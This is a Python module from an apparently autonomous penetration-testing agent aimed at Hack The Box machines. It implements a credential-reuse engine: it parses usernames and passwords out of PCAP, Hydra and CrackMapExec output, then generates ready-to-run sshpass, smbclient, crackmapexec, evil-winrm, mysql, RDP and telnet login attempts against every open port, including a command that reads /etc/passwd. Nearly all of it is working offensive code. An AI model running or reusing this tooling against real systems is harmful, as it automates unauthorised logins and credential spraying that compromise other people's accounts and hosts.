#!/usr/bin/env python3
"""
core/execution/cred_reuse.py — Credential Reuse Engine

When Ariaska discovers credentials (from PCAP analysis, FTP sessions,
brute-force, config files, etc.), this engine generates commands to
try those credentials across all known open services.

The Cap box attack chain relies on this:
    PCAP → FTP creds (nathan:Buck3tH4TF0RM3!) → reuse on SSH → user shell

Architecture:
    SmartOrchestrator discovers credential via output parser
    → CredentialReuseEngine.generate_reuse_commands(cred, open_ports)
    → Returns list of commands to try the cred on SSH, FTP, SMB, etc.
    → SmartCoach can pick these as high-priority next actions

Author: Filip Volf / Ariaska System
Phase: HTB Capability Upgrade
"""

import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple

logger = logging.getLogger("ariaska.cred_reuse")


@dataclass
class DiscoveredCredential:
    """A credential pair discovered during an engagement."""
    username: str
    password: str
    source: str = ""          # How it was found: "pcap", "ftp", "hydra", "config", etc.
    source_service: str = ""  # Service it was found on: "ftp", "web", "smb", etc.
    target_ip: str = ""
    confirmed_on: Set[str] = field(default_factory=set)    # Services confirmed working
    failed_on: Set[str] = field(default_factory=set)       # Services confirmed NOT working
    is_hash: bool = False     # True if password is a hash (no plaintext reuse)

    @property
    def reusable(self) -> bool:
        """Can this credential be reused on other services?"""
        return bool(self.username and self.password and not self.is_hash)

    def __hash__(self):
        return hash((self.username, self.password))

    def __eq__(self, other):
        if not isinstance(other, DiscoveredCredential):
            return False
        return self.username == other.username and self.password == other.password


# Service → (port, command template) mappings for credential reuse
# {target} and {user}/{pass} are substituted at generation time
SERVICE_REUSE_TEMPLATES: Dict[str, List[Tuple[int, str]]] = {
    "ssh": [
        (22, "sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{target} 'id && whoami && cat /etc/passwd | head -5'"),
    ],
    "ftp": [
        (21, "curl -s ftp://{username}:{password}@{target}/ --connect-timeout 5"),
    ],
    "smb": [
        (445, "smbclient -L //{target}/ -U '{username}%{password}' --no-pass 2>/dev/null || smbclient -L //{target}/ -U '{username}' --password='{password}'"),
        (445, "crackmapexec smb {target} -u '{username}' -p '{password}'"),
    ],
    "mysql": [
        (3306, "mysql -h {target} -u {username} -p'{password}' -e 'SELECT user(); SHOW DATABASES;' 2>/dev/null"),
    ],
    "postgresql": [
        (5432, "PGPASSWORD='{password}' psql -h {target} -U {username} -c '\\l' 2>/dev/null"),
    ],
    "rdp": [
        (3389, "xfreerdp /v:{target} /u:{username} /p:'{password}' /cert:ignore +auth-only 2>/dev/null"),
    ],
    "winrm": [
        (5985, "evil-winrm -i {target} -u '{username}' -p '{password}' -c 'whoami' 2>/dev/null"),
    ],
    "telnet": [
        (23, "echo -e '{username}\\n{password}\\nid\\nexit' | telnet {target} 2>/dev/null"),
    ],
}


class CredentialReuseEngine:
    """
    Generates credential reuse commands when new creds are discovered.
    
    Maintains a store of all discovered credentials and tracks which
    service/credential combinations have been tried (to avoid repeats).
    
    Usage:
        engine = CredentialReuseEngine(target_ip="10.129.4.210")
        cred = DiscoveredCredential(username="nathan", password="Buck3tH4TF0RM3!", source="pcap")
        commands = engine.generate_reuse_commands(cred, known_ports={21, 22, 80})
        # → ["sshpass -p 'Buck3tH4TF0RM3!' ssh nathan@10.129.4.210 'id && whoami'",
        #    "curl -s ftp://nathan:Buck3tH4TF0RM3!@10.129.4.210/"]
    """
    
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self._credentials: List[DiscoveredCredential] = []
        self._tried_combinations: Set[Tuple[str, str, str]] = set()  # (user, pass, service)
    
    def add_credential(self, cred: DiscoveredCredential) -> bool:
        """
        Add a discovered credential to the store.
        
        Returns:
            True if this is a NEW credential, False if duplicate.
        """
        if cred in self._credentials:
            logger.debug(f"[CRED-REUSE] Duplicate credential: {cred.username}")
            return False
        
        cred.target_ip = self.target_ip
        self._credentials.append(cred)
        logger.debug(
            f"[CRED-REUSE] New credential stored: {cred.username}:{cred.password[:3]}*** "
            f"(source={cred.source}, service={cred.source_service})"
        )
        return True
    
    # Critical ports that should ALWAYS be tried for credential reuse,
    # even if they haven't been discovered by port scanning yet.
    # SSH is the most valuable reuse target — creds found in PCAP/FTP
    # must be tried on SSH immediately, not after nmap runs.
    ALWAYS_TRY_PORTS = {22, 21}

    def generate_reuse_commands(
        self,
        cred: DiscoveredCredential,
        known_ports: Set[int],
        exclude_source_service: bool = True,
    ) -> List[Dict[str, str]]:
        """
        Generate commands to try a credential across all known open services.
        
        Args:
            cred: The credential to reuse
            known_ports: Set of open ports discovered by recon
            exclude_source_service: Skip the service the cred was found on
            
        Returns:
            List of dicts with 'command' and 'service' keys
        """
        if not cred.reusable:
            return []
        
        # Always include critical ports even if not yet discovered
        effective_ports = known_ports | self.ALWAYS_TRY_PORTS
        
        commands = []
        
        for service, templates in SERVICE_REUSE_TEMPLATES.items():
            # Skip the service the cred was originally found on
            if exclude_source_service and service == cred.source_service:
                continue
            
            for port, template in templates:
                # Only try services whose ports are open (or in always-try set)
                if port not in effective_ports:
                    continue
                
                # Skip already-tried combinations
                combo_key = (cred.username, cred.password, service)
                if combo_key in self._tried_combinations:
                    continue
                
                # Skip known-failed services
                if service in cred.failed_on:
                    continue
                
                # Generate the command
                cmd = template.format(
                    target=self.target_ip,
                    username=cred.username,
                    password=cred.password,
                )
                
                commands.append({
                    "command": cmd,
                    "service": service,
                    "port": port,
                    "username": cred.username,
                    "description": f"Try {cred.username}'s creds on {service}:{port}",
                })
                
                # Mark as tried
                self._tried_combinations.add(combo_key)
        
        if commands:
            logger.debug(
                f"[CRED-REUSE] Generated {len(commands)} reuse commands for "
                f"{cred.username} across services: "
                f"{', '.join(c['service'] for c in commands)}"
            )
        
        return commands
    
    def generate_all_reuse_commands(
        self,
        known_ports: Set[int],
    ) -> List[Dict[str, str]]:
        """
        Generate reuse commands for ALL stored credentials.
        
        Useful when new ports are discovered — re-checks all creds
        against newly available services.
        """
        all_commands = []
        for cred in self._credentials:
            commands = self.generate_reuse_commands(cred, known_ports)
            all_commands.extend(commands)
        return all_commands
    
    def mark_success(self, username: str, password: str, service: str) -> None:
        """Mark a credential as confirmed working on a service."""
        for cred in self._credentials:
            if cred.username == username and cred.password == password:
                cred.confirmed_on.add(service)
                logger.debug(f"[CRED-REUSE] Confirmed: {username} works on {service}")
                break
    
    def mark_failure(self, username: str, password: str, service: str) -> None:
        """Mark a credential as NOT working on a service."""
        for cred in self._credentials:
            if cred.username == username and cred.password == password:
                cred.failed_on.add(service)
                break
    
    def get_all_credentials(self) -> List[DiscoveredCredential]:
        """Return all stored credentials."""
        return list(self._credentials)
    
    def reset(self) -> None:
        """Reset all credential state (per-episode)."""
        self._credentials.clear()
        self._tried_combinations.clear()


def parse_credential_from_output(
    output: str,
    command: str = "",
    source: str = "generic",
) -> List[DiscoveredCredential]:
    """
    Extract credentials from command output.
    
    Handles common formats:
    - FTP/PCAP: "USER nathan" / "PASS Buck3tH4TF0RM3!"
    - Hydra: "[22][ssh] host: 10.129.4.210 login: admin password: admin123"
    - MySQL: "Access denied for user 'root'@..."
    - Generic: "username: X password: Y"
    
    Returns:
        List of DiscoveredCredential objects
    """
    import re
    
    creds = []
    
    # ── FTP credentials in PCAP output (strings/tshark) ──
    # Look for USER/PASS pairs (FTP protocol)
    ftp_users = re.findall(r'USER\s+(\S+)', output)
    ftp_passes = re.findall(r'PASS\s+(\S+)', output)
    if ftp_users and ftp_passes:
        for user, passwd in zip(ftp_users, ftp_passes):
            # Filter out anonymous
            if user.lower() not in ("anonymous", "ftp"):
                creds.append(DiscoveredCredential(
                    username=user,
                    password=passwd,
                    source=source,
                    source_service="ftp",
                ))
    
    # ── Hydra format ──
    hydra_pattern = r'\[(\d+)\]\[(\w+)\]\s+host:\s+(\S+)\s+login:\s+(\S+)\s+password:\s+(\S+)'
    for match in re.finditer(hydra_pattern, output):
        creds.append(DiscoveredCredential(
            username=match.group(4),
            password=match.group(5),
            source="hydra",
            source_service=match.group(2),
        ))
    
    # ── CrackMapExec format ──
    cme_pattern = r'\[\+\]\s+\S+\s+\S+\s+(\S+):(\S+)'
    for match in re.finditer(cme_pattern, output):
        creds.append(DiscoveredCredential(
            username=match.group(1),
            password=match.group(2),
            source="crackmapexec",
            source_service="smb",
        ))
    
    # ── Generic username:password or login/pass patterns ──
    generic_patterns = [
        r'(?:login|username|user)[:\s=]+(\S+)\s+(?:password|passwd|pass)[:\s=]+(\S+)',
        r'(?:password|passwd|pass)[:\s=]+(\S+)\s+(?:login|username|user)[:\s=]+(\S+)',
    ]
    for pattern in generic_patterns:
        for match in re.finditer(pattern, output, re.IGNORECASE):
            groups = match.groups()
            if len(groups) >= 2:
                user, passwd = groups[0], groups[1]
                # For reversed pattern (pass first, user second), swap
                if 'password' in pattern[:30].lower():
                    user, passwd = groups[1], groups[0]
                creds.append(DiscoveredCredential(
                    username=user,
                    password=passwd,
                    source=source,
                    source_service="generic",
                ))
    
    # Deduplicate
    seen = set()
    unique_creds = []
    for c in creds:
        key = (c.username, c.password)
        if key not in seen:
            seen.add(key)
            unique_creds.append(c)
    
    return unique_creds
